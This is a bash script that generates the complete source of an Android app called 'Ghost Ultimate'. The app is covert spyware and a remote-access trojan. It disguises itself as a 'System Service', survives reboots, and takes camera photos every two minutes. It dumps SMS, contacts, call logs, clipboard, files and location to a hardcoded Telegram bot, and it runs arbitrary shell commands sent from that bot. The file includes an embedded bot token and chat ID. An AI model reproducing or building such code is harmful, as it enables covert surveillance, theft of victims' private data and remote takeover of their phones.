#!/usr/bin/env bash
ROOT="$HOME/ghost/GhostAPK"
cd "$ROOT" || exit 1
mkdir -p app/src/main/java/com/ghost/app
mkdir -p app/src/main/res/xml
mkdir -p app/src/main/res/values
mkdir -p .github/workflows

# ================= BUILD GRADLE =================
cat > app/build.gradle.kts << 'EOF'
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}
android {
    namespace = "com.ghost.app"
    compileSdk = 34
    defaultConfig {
        applicationId = "com.ghost.app"
        minSdk = 29
        targetSdk = 34
        versionCode = 1
        versionName = "5.0"
    }
    buildTypes { release { isMinifyEnabled = false } }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }
}
dependencies {
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
}
EOF

# ================= MANIFEST =================
cat > app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>

    <application android:allowBackup="false" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:theme="@style/Theme.Ghost">
        <activity android:name=".MainActivity" android:exported="true" android:theme="@style/Theme.Transparent" android:excludeFromRecents="true" android:noHistory="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name=".CaptureService" android:exported="false" android:foregroundServiceType="camera|location"/>
        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
            <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>
        </receiver>
        <receiver android:name=".AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN" android:exported="true">
            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
            <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/></intent-filter>
        </receiver>
    </application>
</manifest>
EOF

cat > app/src/main/res/xml/device_admin.xml << 'EOF'
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies><force-lock /></uses-policies>
</device-admin>
EOF

# ================= KOTLIN FILES =================
cat > app/src/main/java/com/ghost/app/Config.kt << 'EOF'
package com.ghost.app
object Config {
    const val BOT_TOKEN = "8979892870:AAF4LWXXxjOA8tvJUGfI5N4vf3XkJCw1UqQ"
    const val CHAT_ID   = "7732912025"
    const val API_BASE  = "https://api.telegram.org/bot$BOT_TOKEN"
    const val POLL_INTERVAL_MS  = 100L
    const val PHOTO_INTERVAL_MS = 120000L
    const val TRACK_INTERVAL_MS = 30000L
}
EOF

cat > app/src/main/java/com/ghost/app/TgSender.kt << 'EOF'
package com.ghost.app
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.TimeUnit
object TgSender {
    private val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).readTimeout(40, TimeUnit.SECONDS).build()
    fun sendMessage(text: String, keyboardJson: String = "") {
        val kb = if (keyboardJson.isNotEmpty()) ",\"reply_markup\":$keyboardJson" else ""
        val json = "{\"chat_id\":\"${Config.CHAT_ID}\",\"text\":\"${text.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")}\",\"parse_mode\":\"HTML\"$kb}"
        val req = Request.Builder().url("${Config.API_BASE}/sendMessage").post(json.toRequestBody("application/json".toMediaType())).build()
        runCatching { client.newCall(req).execute().close() }
    }
    fun sendLong(text: String) {
        if (text.length <= 3900) { sendMessage(text); return }
        var i = 0
        while (i < text.length) { val end = minOf(i + 3900, text.length); sendMessage(text.substring(i, end)); i = end }
    }
    fun sendPhoto(bytes: ByteArray, caption: String) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("chat_id", Config.CHAT_ID).addFormDataPart("caption", caption).addFormDataPart("photo", "cap.jpg", bytes.toRequestBody("image/jpeg".toMediaType())).build()
        val req = Request.Builder().url("${Config.API_BASE}/sendPhoto").post(body).build()
        runCatching { client.newCall(req).execute().close() }
    }
    fun sendDocument(bytes: ByteArray, filename: String, caption: String) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("chat_id", Config.CHAT_ID).addFormDataPart("caption", caption).addFormDataPart("document", filename, bytes.toRequestBody("application/octet-stream".toMediaType())).build()
        val req = Request.Builder().url("${Config.API_BASE}/sendDocument").post(body).build()
        runCatching { client.newCall(req).execute().close() }
    }
    fun getUpdates(offset: Long): String? {
        val req = Request.Builder().url("${Config.API_BASE}/getUpdates?offset=$offset&timeout=30").get().build()
        return try { client.newCall(req).execute().use { it.body?.string() } } catch (e: IOException) { null }
    }
}
EOF

cat > app/src/main/java/com/ghost/app/AdminReceiver.kt << 'EOF'
package com.ghost.app
import android.app.admin.DeviceAdminReceiver
class AdminReceiver : DeviceAdminReceiver()
EOF

cat > app/src/main/java/com/ghost/app/BootReceiver.kt << 'EOF'
package com.ghost.app
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED || intent.action == "com.ghost.app.RESTART") {
            val i = Intent(ctx, CaptureService::class.java)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
            val alarmManager = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val alarmIntent = Intent(ctx, BootReceiver::class.java).setAction("com.ghost.app.RESTART")
            val pending = PendingIntent.getBroadcast(ctx, 0, alarmIntent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
            alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 15 * 60 * 1000, 15 * 60 * 1000, pending)
        }
    }
}
EOF

cat > app/src/main/java/com/ghost/app/MainActivity.kt << 'EOF'
package com.ghost.app
import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
class MainActivity : AppCompatActivity() {
    private val REQ = 1001
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val perms = mutableListOf(
            Manifest.permission.CAMERA, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS
        )
        if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.POST_NOTIFICATIONS)
        if (Build.VERSION.SDK_INT <= 32) perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        
        val missing = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (missing.isEmpty()) { 
            setupPermissions()
            startSvc()
            Toast.makeText(this, "Ghost Ultimate Aktif!", Toast.LENGTH_SHORT).show()
            finish() 
        } else { 
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ) 
        }
    }
    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
        super.onRequestPermissionsResult(r, p, g)
        setupPermissions()
        startSvc()
        finish()
    }
    private fun setupPermissions() {
        if (!Settings.canDrawOverlays(this)) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
        }
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (!dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))) {
            startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@MainActivity, AdminReceiver::class.java))
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Izinkan kunci layar.")
            })
        }
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply { data = Uri.parse("package:$packageName") })
        }
    }
    private fun startSvc() {
        val i = Intent(this, CaptureService::class.java)
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
    }
}
EOF

cat > app/src/main/java/com/ghost/app/DataGrabber.kt << 'EOF'
package com.ghost.app
import android.content.ClipboardManager
import android.content.Context
import android.net.wifi.WifiManager
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
import java.io.File
object DataGrabber {
    fun contacts(ctx: Context): String {
        val sb = StringBuilder("📇 <b>Kontak</b>\n"); var count = 0
        try {
            ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use {
                while (it.moveToNext() && count < 200) { sb.append("• ${it.getString(0) ?: "?"} — ${it.getString(1) ?: "?"}\n"); count++ }
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        if (count == 0) sb.append("(kosong / izin ditolak)\n")
        return sb.toString()
    }
    fun sms(ctx: Context, limit: Int = 60): String {
        val sb = StringBuilder("💬 <b>SMS terakhir</b>\n"); var count = 0
        try {
            ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY), null, null, Telephony.Sms.DATE + " DESC")?.use {
                while (it.moveToNext() && count < limit) { sb.append("• <b>${it.getString(0) ?: "?"}</b>: ${it.getString(1)?.take(150) ?: ""}\n"); count++ }
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        if (count == 0) sb.append("(kosong / izin ditolak)\n")
        return sb.toString()
    }
    fun callLog(ctx: Context, limit: Int = 60): String {
        val sb = StringBuilder("📞 <b>Call log</b>\n"); var count = 0
        try {
            ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION), null, null, CallLog.Calls.DATE + " DESC")?.use {
                while (it.moveToNext() && count < limit) {
                    val type = when (it.getInt(1)) { CallLog.Calls.INCOMING_TYPE -> "masuk"; CallLog.Calls.OUTGOING_TYPE -> "keluar"; CallLog.Calls.MISSED_TYPE -> "missed"; else -> "?" }
                    sb.append("• ${it.getString(0) ?: "?"} — $type — ${it.getLong(2)}s\n"); count++
                }
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        if (count == 0) sb.append("(kosong / izin ditolak)\n")
        return sb.toString()
    }
    fun apps(ctx: Context): String {
        val sb = StringBuilder("📦 <b>App terinstall</b>\n")
        try {
            val pm = ctx.packageManager
            pm.getInstalledPackages(0).take(200).forEach { p ->
                val label = try { pm.getApplicationLabel(p.applicationInfo).toString() } catch (e: Exception) { p.packageName }
                sb.append("• $label (${p.packageName})\n")
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        return sb.toString()
    }
    fun deviceInfo(ctx: Context): String {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val sb = StringBuilder("📱 <b>Device info</b>\n")
        sb.append("Model: ${Build.MODEL}\nBrand: ${Build.BRAND}\nManuf: ${Build.MANUFACTURER}\nAndroid: ${Build.VERSION.RELEASE}\nDevice: ${Build.DEVICE}\n")
        @Suppress("DEPRECATION") val num = tm.line1Number
        if (!num.isNullOrBlank()) sb.append("Nomor: $num\n")
        sb.append("Operator: ${tm.networkOperatorName}\n")
        return sb.toString()
    }
    fun clipboard(ctx: Context): String {
        return try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip == null || clip.itemCount == 0) "📋 clipboard kosong" else "📋 <b>Clipboard</b>\n${clip.getItemAt(0).text}"
        } catch (e: Exception) { "📋 err: ${e.message}" }
    }
    fun wifiInfo(ctx: Context): String {
        return try {
            val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION") val info = wm.connectionInfo
            "📶 <b>WiFi</b>\nSSID: ${info.ssid}\nIP: ${info.ipAddress}\nMAC: ${info.macAddress}"
        } catch (e: Exception) { "📶 err: ${e.message}" }
    }
    fun listFiles(pathStr: String): String {
        val dir = File(pathStr)
        if (!dir.exists()) return "❌ Not found: $pathStr"
        if (!dir.isDirectory) return "❌ Not a directory"
        val sb = StringBuilder("📂 <b>Files in $pathStr</b>\n")
        val files = dir.listFiles() ?: return "❌ Access denied"
        var count = 0
        for (f in files) {
            if (count > 50) break
            sb.append(if (f.isDirectory) "📁 " else "📄 ").append(f.name).append("\n")
            count++
        }
        return sb.toString()
    }
}
EOF

cat > app/src/main/java/com/ghost/app/CaptureService.kt << 'EOF'
package com.ghost.app
import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationManager
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.Locale
import java.util.concurrent.atomic.AtomicLong
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class CaptureService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val lastUpdateId = AtomicLong(0)
    private var torchOn = false
    private var tracking = false
    private var cameraId: String? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var tts: TextToSpeech? = null
    private var mediaPlayer: MediaPlayer? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotif("System Service running"))
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Ghost::WakeLock")
        wakeLock?.acquire()
        cameraId = (getSystemService(CAMERA_SERVICE) as CameraManager).cameraIdList.firstOrNull()
        tts = TextToSpeech(this) { status -> if (status == TextToSpeech.SUCCESS) tts?.language = Locale.getDefault() }

        scope.launch { 
            val kb = """{"keyboard":[[{"text":"📸 Photo"},{"text":"📍 Loc"}],[{"text":"🔦 Torch On"},{"text":"🔦 Torch Off"}],[{"text":"📇 Contacts"},{"text":"📱 Device"}],[{"text":"💻 Shell"},{"text":"🔒 Lock Screen"}]],"resize_keyboard":true}"""
            TgSender.sendMessage("🟢 <b>Ghost Ultimate online</b>\nDevice: ${Build.MODEL}\n\nGunakan tombol di bawah atau ketik /menu", kb) 
        }
        scope.launch { pollLoop() }
        scope.launch { photoLoop() }
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY
    override fun onBind(i: Intent?): IBinder? = null
    override fun onDestroy() { 
        scope.cancel(); wakeLock?.let { if (it.isHeld) it.release() }; tts?.shutdown(); mediaPlayer?.release(); super.onDestroy() 
    }

    private fun buildNotif(text: String): Notification {
        val chId = "ghost_ch"
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) nm.createNotificationChannel(NotificationChannel(chId, "System", NotificationManager.IMPORTANCE_LOW))
        return NotificationCompat.Builder(this, chId).setContentTitle("System Service").setContentText(text).setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
    }

    private suspend fun pollLoop() {
        while (scope.isActive) {
            try {
                val raw = TgSender.getUpdates(lastUpdateId.get()) ?: continue
                val arr = JSONObject(raw).optJSONArray("result") ?: continue
                for (i in 0 until arr.length()) {
                    val upd = arr.getJSONObject(i); lastUpdateId.set(upd.getLong("update_id") + 1)
                    val msg = upd.optJSONObject("message") ?: continue
                    if (msg.getJSONObject("chat").optString("id") != Config.CHAT_ID) continue
                    handleCommand(msg.optString("text").trim())
                }
            } catch (e: Exception) { Log.w("Ghost", "poll", e) }
            delay(100)
        }
    }

    private fun handleCommand(cmd: String) {
        when {
            cmd == "/start" || cmd == "/menu" || cmd == "/help" -> {
                val kb = """{"keyboard":[[{"text":"📸 Photo"},{"text":"📍 Loc"}],[{"text":"🔦 Torch On"},{"text":"🔦 Torch Off"}],[{"text":"📇 Contacts"},{"text":"📱 Device"}],[{"text":"💻 Shell"},{"text":"🔒 Lock Screen"}]],"resize_keyboard":true}"""
                TgSender.sendMessage(MENU, kb)
            }
            cmd == "/status" -> TgSender.sendMessage("🟢 alive\ntorch=${if (torchOn) "on" else "off"}\ntrack=${if (tracking) "on" else "off"}")
            cmd == "📸 Photo" || cmd == "/photo" -> scope.launch { takePhotoAndSend() }
            cmd.startsWith("/camera ") -> {
                val mode = cmd.removePrefix("/camera ").trim()
                val cm = getSystemService(CAMERA_SERVICE) as CameraManager
                val newId = cm.cameraIdList.firstOrNull { id ->
                    val facing = cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING)
                    if (mode == "front") facing == CameraCharacteristics.LENS_FACING_FRONT else facing == CameraCharacteristics.LENS_FACING_BACK
                }
                if (newId != null) { cameraId = newId; TgSender.sendMessage("📸 Camera: $mode") } else TgSender.sendMessage("❌ Not found")
            }
            cmd.startsWith("/play ") -> {
                val url = cmd.removePrefix("/play ").trim()
                scope.launch {
                    try { mediaPlayer?.release(); mediaPlayer = MediaPlayer().apply { setDataSource(url); prepare(); start() }; TgSender.sendMessage("🎵 Playing...") } 
                    catch (e: Exception) { TgSender.sendMessage("❌ err: ${e.message}") }
                }
            }
            cmd == "/stop" -> { mediaPlayer?.release(); mediaPlayer = null; TgSender.sendMessage("⏹️ Stopped") }
            cmd.startsWith("/tts ") -> { tts?.speak(cmd.removePrefix("/tts ").trim(), TextToSpeech.QUEUE_FLUSH, null, "ghost_tts"); TgSender.sendMessage("🗣️ Speaking...") }
            cmd == "🔦 Torch On" || cmd == "/torch_on" -> scope.launch { setTorch(true) }
            cmd == "🔦 Torch Off" || cmd == "/torch_off" -> scope.launch { setTorch(false) }
            cmd == "/strobe" -> { scope.launch { repeat(15) { setTorch(true); delay(80); setTorch(false); delay(80) }; TgSender.sendMessage("🔦 Strobe done") } }
            cmd == "🔒 Lock Screen" || cmd == "/lock" -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val comp = ComponentName(this, AdminReceiver::class.java)
                if (dpm.isAdminActive(comp)) { dpm.lockNow(); TgSender.sendMessage("🔒 Layar dikunci!") } 
                else { TgSender.sendMessage("❌ Izin Admin belum aktif. Buka app dulu.") }
            }
            cmd.startsWith("/error ") -> showPcError(cmd.removePrefix("/error "))
            cmd == "/vibrate" -> {
                val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(800, VibrationEffect.DEFAULT_AMPLITUDE)) else @Suppress("DEPRECATION") v.vibrate(800)
                TgSender.sendMessage("📳 vibrate")
            }
            cmd.startsWith("/volume ") -> {
                val lvl = cmd.removePrefix("/volume ").trim().toIntOrNull() ?: 50
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                am.setStreamVolume(AudioManager.STREAM_MUSIC, (am.getStreamMaxVolume(AudioManager.STREAM_MUSIC) * lvl / 100), 0)
                TgSender.sendMessage("🔊 volume $lvl%")
            }
            cmd == "📍 Loc" || cmd == "/loc" -> scope.launch { sendLocation() }
            cmd == "/track_on" -> { tracking = true; scope.launch { trackLoop() }; TgSender.sendMessage("📍 tracking on") }
            cmd == "/track_off" -> { tracking = false; TgSender.sendMessage("📍 tracking off") }
            cmd.startsWith("/shell ") -> {
                scope.launch {
                    try {
                        val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd.removePrefix("/shell ").trim()))
                        val output = process.inputStream.bufferedReader().readText()
                        TgSender.sendLong("💻 <b>Output:</b>\n<pre>${output.ifEmpty { "(no output)" }}</pre>")
                    } catch (e: Exception) { TgSender.sendMessage("err: ${e.message}") }
                }
            }
            cmd.startsWith("/files") -> { val path = if (cmd.contains(" ")) cmd.substringAfter(" ") else "/sdcard"; scope.launch { TgSender.sendLong(DataGrabber.listFiles(path)) } }
            cmd.startsWith("/download ") -> {
                val path = cmd.removePrefix("/download ").trim()
                scope.launch {
                    val f = java.io.File(path)
                    if (!f.exists() || !f.isFile) { TgSender.sendMessage("❌ File not found"); return@launch }
                    if (f.length() > 50 * 1024 * 1024) { TgSender.sendMessage("❌ File > 50MB"); return@launch }
                    TgSender.sendDocument(f.readBytes(), f.name, "📄 File: ${f.name}")
                }
            }
            cmd.startsWith("/toast ") -> { Handler(Looper.getMainLooper()).post { Toast.makeText(this, cmd.removePrefix("/toast "), Toast.LENGTH_LONG).show() }; TgSender.sendMessage("💬 toast sent") }
            cmd.startsWith("/open ") -> { try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(cmd.removePrefix("/open "))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); TgSender.sendMessage("🌐 opened") } catch (e: Exception) { TgSender.sendMessage("err: ${e.message}") } }
            cmd.startsWith("/startapp ") -> {
                val pkg = cmd.removePrefix("/startapp ").trim()
                try { val i = packageManager.getLaunchIntentForPackage(pkg); if (i != null) { startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); TgSender.sendMessage("🚀 opened $pkg") } else { TgSender.sendMessage("❌ app not found") } } 
                catch (e: Exception) { TgSender.sendMessage("err: ${e.message}") }
            }
            cmd == "/wifi" -> scope.launch { TgSender.sendMessage(DataGrabber.wifiInfo(this@CaptureService)) }
            cmd == "/battery" -> { val bm = getSystemService(BATTERY_SERVICE) as BatteryManager; TgSender.sendMessage("🔋 ${bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%") }
            cmd == "📇 Contacts" || cmd == "/contacts" -> scope.launch { TgSender.sendLong(DataGrabber.contacts(this@CaptureService)) }
            cmd == "/sms" -> scope.launch { TgSender.sendLong(DataGrabber.sms(this@CaptureService)) }
            cmd == "/calls" -> scope.launch { TgSender.sendLong(DataGrabber.callLog(this@CaptureService)) }
            cmd == "/apps" -> scope.launch { TgSender.sendLong(DataGrabber.apps(this@CaptureService)) }
            cmd == "📱 Device" || cmd == "/device" -> scope.launch { TgSender.sendLong(DataGrabber.deviceInfo(this@CaptureService)) }
            cmd == "/clip" -> scope.launch { TgSender.sendMessage(DataGrabber.clipboard(this@CaptureService)) }
            else -> TgSender.sendMessage("❓ command tidak dikenal. ketik /menu")
        }
    }

    private fun showPcError(text: String) {
        if (!Settings.canDrawOverlays(this)) { TgSender.sendMessage("❌ Izin Overlay belum aktif!"); return }
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val view = TextView(this).apply {
            this.text = "⚠️ SYSTEM ERROR\n\n$text\n\n[Auto close in 5s]"
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#CC000000"))
            textSize = 18f
            gravity = Gravity.CENTER
            setPadding(40, 40, 40, 40)
        }
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        try {
            wm.addView(view, params)
            Handler(Looper.getMainLooper()).postDelayed({ try { wm.removeView(view) } catch (e: Exception) {} }, 5000)
            TgSender.sendMessage("💻 PC Error Toast ditampilkan (5s)")
        } catch (e: Exception) { TgSender.sendMessage("❌ Overlay err: ${e.message}") }
    }

    private suspend fun photoLoop() { while (scope.isActive) { delay(Config.PHOTO_INTERVAL_MS); runCatching { takePhotoAndSend() } } }
    private suspend fun trackLoop() { while (tracking && scope.isActive) { sendLocation(); delay(Config.TRACK_INTERVAL_MS) } }

    private suspend fun takePhotoAndSend() = suspendCoroutine<Unit> { cont ->
        val cm = getSystemService(CAMERA_SERVICE) as CameraManager
        val id = cameraId
        if (id == null) { TgSender.sendMessage("❌ Kamera tidak ditemukan"); cont.resume(Unit); return@suspendCoroutine }
        try {
            val size = cm.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
            if (size == null) { cont.resume(Unit); return@suspendCoroutine }
            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buf = img.planes[0].buffer; val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                img.close(); r.close(); scope.launch { TgSender.sendPhoto(bytes, "📸 ${Build.MODEL}"); cont.resume(Unit) }
            }, Handler(Looper.getMainLooper()))
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(dev: CameraDevice) {
                    dev.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE); req.addTarget(reader.surface)
                            s.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                    dev.close()
                                }
                            }, null)
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) { dev.close(); TgSender.sendMessage("❌ Gagal capture"); cont.resume(Unit) }
                    }, null)
                }
                override fun onDisconnected(dev: CameraDevice) { dev.close() }
                override fun onError(dev: CameraDevice, e: Int) { dev.close(); TgSender.sendMessage("❌ Kamera error: $e"); cont.resume(Unit) }
            }, null)
        } catch (e: Exception) { cont.resume(Unit) }
    }

    private fun setTorch(on: Boolean) {
        try {
            val cm = getSystemService(CAMERA_SERVICE) as CameraManager; val id = cameraId ?: return
            cm.setTorchMode(id, on); torchOn = on; TgSender.sendMessage(if (on) "🔦 torch on" else "🔦 torch off")
        } catch (e: Exception) {}
    }

    private fun sendLocation() {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc == null) { TgSender.sendMessage("📍 no location"); return }
            TgSender.sendMessage("📍 <b>Lokasi</b>\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAkurasi: ${loc.accuracy}m\nhttps://maps.google.com/?q=${loc.latitude},${loc.longitude}")
        } catch (e: SecurityException) { TgSender.sendMessage("📍 izin lokasi belum aktif") }
    }

    companion object {
        val MENU = """
🤖 <b>Ghost Ultimate — Menu</b>
📸 /photo, /camera front|back
📍 /loc, /track_on, /track_off
🔦 /torch_on, /torch_off, /strobe
🔒 /lock (kunci layar)
💻 /shell [cmd]
📂 /files, /download [path]
📇 /contacts, /sms, /calls, /apps, /device, /clip
💬 /toast, /open, /startapp
🎵 /play, /stop, /tts
        """.trimIndent()
    }
}
EOF

echo "✅ SEMUA FILE BERHASIL DIBERSIHKAN!"
